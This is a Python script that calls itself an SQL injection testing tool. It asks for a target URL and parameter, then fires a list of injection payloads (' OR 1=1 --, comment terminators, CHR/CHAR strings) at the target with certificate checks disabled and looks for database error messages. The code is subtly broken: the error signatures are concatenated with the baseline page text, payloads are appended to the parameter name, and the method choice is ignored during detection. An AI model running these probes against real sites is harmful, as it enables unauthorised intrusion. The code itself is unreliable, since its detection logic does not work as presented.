import requests
import string
import sys
import re
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress the InsecureRequestWarning warning when making SSL requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Default error messages for each database management system
default_error_messages = {
    "MySQL": "You have an error in your SQL syntax;",
    "MSSQL": "Microsoft OLE DB Provider for SQL Server",
    "Postgres": "ERROR:",
    "Oracle": "ORA-",
    "MSAccess": "Microsoft JET Database Engine",
}

def banner():
    print("\nSQL injection tool for testing and education purposes.\n")

def read_txt_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
        return urls
    except FileNotFoundError:
        print("The file specified does not exist. Exiting.")
        sys.exit()

def extract_data(url, method, headers, data, proxy, param):
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, verify=False, params=param, timeout=10, proxies=proxy)
        elif method == "POST":
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=10, proxies=proxy)
        # ... more methods ...
    except requests.exceptions.RequestException as err:
        print ("The request could not be completed. Exiting.")
        sys.exit()
    except requests.exceptions.HTTPError as errh:
        print ("HTTP Error:", errh)
        sys.exit()
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:", errc)
        sys.exit()
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:", errt)
        sys.exit()
    except Exception as e:
        print("An error occurred:", e)
        sys.exit()
    return response

def detect_injection(url, param, error_messages):
    try:
        injection_strings = ['" OR 1=1 --', "' OR 1=1 --", ")) OR 1=1 --", "))) OR 1=1 --",
                            "-- -", "/* ", "*/ ", "; --", ";", "%27 --",
                            "%23 ", " %23", "X' OR 1=1 --", "X' ) OR 1=1 --", "CHR(47)||CHR(117)||CHR(114)||CHR(101)||CHR(47)",
                            "CHR(47)||CHR(100)||CHR(100)||CHR(114)||CHR(101)||CHR(47)",
                            "CHAR(47)||CHAR(117)||CHAR(114)||CHAR(101)||CHAR(47)",
                            "CHAR(47)||CHAR(100)||CHAR(100)||CHAR(114)||CHAR(101)||CHAR(47)"]

        for injection_string in injection_strings:
            injection_payload = param + injection_string
            response = extract_data(url, "GET", headers=None, data=None, proxy=None, param=injection_payload)

            if any(error_message in response.text for error_message in error_messages.values()):
                return True, response

        return False, None
    except Exception as e:
        print("An error occurred:", e)
        sys.exit()

def main():
    banner()

    url = input("Enter the target URL: ")
    method = input("Enter the request method (GET, POST, etc.): ")
    param = input("Enter the parameter name to test for SQL injection: ")

    if "https://" not in url and "http://" not in url:
        url = "http://" + url

    print("\n[+] Checking for SQL injection vulnerability...\n")

    # Automatically detect the type of database management system (DBMS)
    # This could be expanded to support other DBMS types
    error_messages = {}
    for dbms in default_error_messages.keys():
        response = extract_data(url, method, headers=None, data=None, proxy=None, param=param)
        error_messages[dbms] = default_error_messages[dbms] + response.text

    detected, response = detect_injection(url, param, error_messages)

    if detected:
        print("[+] SQL injection vulnerability detected.\n")
        print("Response:\n", response.text)
    else:
        print("[-] No SQL injection vulnerability detected.\n")

if __name__ == "__main__":
    main()
